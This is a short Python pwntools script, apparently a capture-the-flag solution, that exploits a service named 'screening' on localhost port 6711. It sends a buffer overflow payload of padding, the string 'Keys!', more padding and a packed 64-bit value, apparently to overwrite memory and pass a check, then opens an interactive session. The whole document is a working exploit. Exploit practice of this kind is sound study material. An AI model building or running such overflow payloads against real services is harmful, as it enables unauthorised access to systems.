from pwn import *
r = remote('localhost',6711)
#r = process('./screening')
payload = b'A'*128 + b'Keys!\0' + b'A'*10 + p64(1)
r.sendline(payload)
r.interactive()
